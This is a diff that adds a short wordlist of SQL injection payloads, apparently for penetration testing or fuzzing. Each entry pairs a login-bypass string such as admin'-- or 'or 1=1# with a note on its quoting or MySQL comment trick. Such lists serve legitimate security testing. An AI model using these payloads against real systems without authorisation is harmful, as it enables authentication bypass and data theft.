@@ -1,0 +1,14 @@
+admin'--	SQL 101 - test for admin with comment
+admin'		SQL 101 - test for admin without comments
+'test		SQL injection test
+'test--		SQL injection test with comments
+'or 1=1--	or 1=1 with comments for alpha
+or 1=1--	or 1=1 for numbers
+'or 1=1		or 1=1 without comments for alpha
+or 1=1		or 1=1 without comments for numbers
+'or '1'='1	or 1=1 by completing the query
+' or 1=1#	or 1=1 with mysql commenting - alpha
+or 1=1#		or 1=1 with mysql commenting - numbers
+or 1=1		or 1=1 with no comments for numbers
+" or 1=1#	or 1=1 with terminating string a quote
+admin'#		username admin with mysql commenting
